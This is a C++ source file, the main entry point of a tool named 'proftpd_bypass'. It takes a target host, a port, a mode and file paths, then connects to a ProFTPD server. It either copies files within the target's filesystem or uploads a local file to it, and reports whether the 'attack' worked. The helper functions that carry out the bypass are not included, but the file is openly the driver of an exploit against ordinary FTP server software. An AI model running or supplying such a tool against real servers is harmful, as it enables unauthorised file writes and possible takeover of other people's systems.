#include "hdr.h"

int main(int argc, char* argv[]) {
    if (argc != 6){
        cout << "Usage:" << endl << "proftpd_bypass [target] [port] [(l)copy within/(r)copy to] [lpath] [rpath]" << endl;
        return 1;
    }

    SOCKET sock = connect_host(argv[1], argv[2]);

    if (sock == -1) {
        cout << "Error starting Winsock." << endl;
        return 0;
    }
    else if (sock == -2) {
        cout << "The target could not be found." << endl;
        return 0;
    }
    else if (sock == -3) {
        cout << "Error connecting to target" << endl;
        return 0;
    }
    else if (sock == -4) {
        cout << "Error connecting to target" << endl;
        return 0;
    }

    if (string(argv[3]) == "l") {
        switch (local(sock, argv[4], argv[5])){
            case 0: cout << "Either the target is immune to this attack, or " << argv[4] << " doesn't exit on their filesystem."; break;
            case 1: cout << "Copied to " << argv[5] << "!" << endl; break;
        }
    }
    else {
        switch (remote(sock, argv[4], argv[5])) {
            case 0: cout << "The target is immune to this attack." << endl; break;
            case 1: cout << "Uploaded to " << argv[5] << "!" << endl; break;
            case 2: cout << argv[4] << " doesn't exist on your computer. Are you sure you're using the correct mode?" << endl; break;
        }
    }

    return 1;
}